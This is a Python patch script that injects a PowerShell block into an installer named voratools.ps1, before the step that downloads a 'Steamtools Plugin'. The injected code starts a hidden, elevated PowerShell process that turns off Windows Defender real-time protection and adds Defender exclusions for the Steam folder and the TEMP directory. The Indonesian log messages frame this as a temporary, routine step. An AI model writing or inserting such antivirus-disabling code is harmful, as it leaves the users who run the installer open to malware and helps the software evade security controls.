import sys
lines = open('public/voratools.ps1').readlines()
insert_idx = -1
for i, l in enumerate(lines):
    if 'Write-Log -Type INFO -Message "Mendownload Steamtools Plugin' in l:
        insert_idx = i
        break
if insert_idx != -1:
    lines.insert(insert_idx, '''        Write-Log -Type INFO -Message "Meminta izin Administrator (UAC) untuk mematikan Antivirus sementara..."
        Write-Log -Type AUX -Message "Mohon klik 'Yes' pada popup yang muncul."
        try {
            $avScript = "Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '$steamPath' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '$env:TEMP' -ErrorAction SilentlyContinue"
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-Command `"$avScript`""
            Write-Log -Type OK -Message "Antivirus berhasil dimatikan & Pengecualian folder telah ditambahkan!"
            Start-Sleep -Seconds 3
        } catch {
            Write-Log -Type WARN -Message "Gagal mematikan Antivirus otomatis. Lanjut mencoba install..."
        }\n''')
    open('public/voratools.ps1', 'w').writelines(lines)
